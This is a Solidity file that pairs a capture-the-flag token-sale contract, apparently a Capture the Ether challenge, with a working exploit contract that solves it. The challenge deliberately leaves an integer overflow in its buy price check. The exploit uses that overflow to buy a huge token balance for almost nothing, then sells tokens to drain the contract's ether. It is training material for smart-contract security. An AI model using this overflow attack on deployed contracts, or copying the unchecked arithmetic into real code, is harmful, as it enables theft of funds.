pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract TokenSaleExploit {
    uint256 constant OVERFLOW = (uint256(-1) / 10**18) + 1;

    function TokenSaleExploit(address _t) public payable {
        TokenSaleChallenge _target = TokenSaleChallenge(_t);
        _target.buy.value(getSendAmount())(OVERFLOW);
        _target.sell(1);

        require(_target.isComplete());

        selfdestruct(msg.sender);
    }

    function getSendAmount() public pure returns (uint256) {
        return OVERFLOW * 1 ether;
    }

    function() public payable {}
}
